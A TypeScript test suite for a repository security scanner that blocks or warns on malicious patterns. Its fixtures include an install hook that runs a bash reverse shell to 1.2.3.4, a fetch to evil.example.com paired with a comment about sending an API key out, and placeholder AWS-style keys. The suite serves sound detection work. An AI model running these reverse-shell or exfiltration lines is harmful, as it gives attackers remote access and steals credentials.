import assert from "node:assert/strict";
import { mkdirSync, mkdtempSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { test } from "node:test";
import type { Router } from "../providers/router.js";
import { analyzeRepo, llmAdvisory } from "./repoanalyzer.js";

function repo(files: Record<string, string>): string {
  const dir = mkdtempSync(join(tmpdir(), "repo-"));
  for (const [rel, text] of Object.entries(files)) {
    const full = join(dir, rel);
    mkdirSync(join(full, ".."), { recursive: true });
    writeFileSync(full, text);
  }
  return dir;
}

test("analyzeRepo: blocks a repo with an install hook + reverse shell, names the rules", () => {
  const dir = repo({
    "package.json": JSON.stringify({ name: "evil", scripts: { postinstall: "node steal.js" } }),
    "steal.js": "const c = require('child_process');\nc.exec('bash -i >& /dev/tcp/1.2.3.4/9001 0>&1');",
  });
  const { findings, blocked } = analyzeRepo(dir);
  assert.equal(blocked, true);
  const rules = new Set(findings.map((f) => f.rule));
  assert.equal(rules.has("install-hook"), true); // block
  assert.equal(rules.has("reverse-shell"), true); // block
  assert.equal(rules.has("shell-out"), true); // warn — surfaced too
});

test("analyzeRepo: blocks on exfiltration and flags calls-home to a non-allowlisted host", () => {
  const dir = repo({
    "index.js": "// send the api_key from .env to our server\nfetch('https://evil.example.com/collect');",
  });
  const { findings, blocked } = analyzeRepo(dir);
  assert.equal(blocked, true); // exfiltration phrasing
  assert.equal(findings.some((f) => f.rule === "exfiltration"), true);
  assert.equal(findings.some((f) => f.rule === "calls-home" && /evil\.example\.com/.test(f.message)), true);
});

test("analyzeRepo §10: a block-class finding in a test/example path is downgraded to warn", () => {
  const key = "AKIAIOSFODNN7EXAMPLE"; // AWS key shape — a block-class finding
  const envEx = analyzeRepo(repo({ ".env.example": `AWS_KEY=${key}` }));
  assert.equal(envEx.blocked, false); // .env.example is a placeholder path
  assert.equal(
    envEx.findings.some((f) => f.rule === "aws-key" && f.severity === "warn"),
    true,
  );
  const testFile = analyzeRepo(repo({ "creds.test.ts": `const k = '${key}';` }));
  assert.equal(testFile.blocked, false); // *.test.ts is low-trust
});

test("analyzeRepo §10: the SAME finding in a runtime file still blocks", () => {
  const { blocked, findings } = analyzeRepo(repo({ "config.ts": "const k = 'AKIAIOSFODNN7EXAMPLE';" }));
  assert.equal(blocked, true);
  assert.equal(findings.some((f) => f.rule === "aws-key" && f.severity === "block"), true);
});

test("analyzeRepo §10: exfil phrasing without an egress call is a warn, not a block", () => {
  const { blocked, findings } = analyzeRepo(repo({ "util.ts": "// send the api_key from .env to our server\nexport const x = 1;" }));
  assert.equal(blocked, false); // no fetch/http — advisory only
  assert.equal(findings.some((f) => f.rule === "exfiltration" && f.severity === "warn"), true);
});

test("analyzeRepo: a public kebab-case client-id is a warn, not a block; a real high-entropy key still blocks", () => {
  const pub = analyzeRepo(repo({ "provider.mjs": "const API_KEY = 'jobboerse-jobsuche'; // public UI client key" }));
  assert.equal(pub.blocked, false);
  assert.equal(pub.findings.some((f) => f.rule === "hardcoded-secret" && f.severity === "warn"), true);
  const real = analyzeRepo(repo({ "config.mjs": "const API_KEY = 'sk-Live-9fZ3xQ2ab7KdPn';" }));
  assert.equal(real.blocked, true); // mixed-case high-entropy value stays a block
});

test("analyzeRepo: a root test harness (test-all.mjs) is low-trust — block-class findings downgrade to warn", () => {
  const { blocked, findings } = analyzeRepo(
    repo({ "test-all.mjs": "// send the api_key from .env somewhere\nglobalThis.fetch = async () => ({});" }),
  );
  assert.equal(blocked, false); // test-* harness, even at repo root
  assert.equal(findings.some((f) => f.rule === "exfiltration" && f.severity === "warn"), true);
});

test("analyzeRepo: a SQL-shaped string in a yaml config is not a sql-injection finding (config, not code)", () => {
  const { findings } = analyzeRepo(repo({ "action.yml": "run: SELECT * FROM t WHERE id = ${{ inputs.id }}\n" }));
  assert.equal(findings.some((f) => f.rule === "sql-injection"), false);
});

test("llmAdvisory: returns the LLM review, and is advisory only (never touches the block verdict)", async () => {
  const dir = repo({ "index.js": "export const add = (a, b) => a + b;" });
  const stub = { chat: async () => ({ content: "none" }) } as unknown as Router;
  assert.equal(await llmAdvisory(stub, "m", dir), "none");
  assert.equal(analyzeRepo(dir).blocked, false); // deterministic gate is independent of the advisory
});

test("analyzeRepo: a clean, licensed repo passes with no blockers", () => {
  const dir = repo({
    "package.json": JSON.stringify({ name: "nice", license: "MIT", scripts: { test: "node --test" } }),
    "LICENSE": "MIT License",
    "index.js": "export const add = (a, b) => a + b;",
  });
  const { findings, blocked } = analyzeRepo(dir);
  assert.equal(blocked, false);
  assert.deepEqual(findings, []); // nothing to warn about either
});
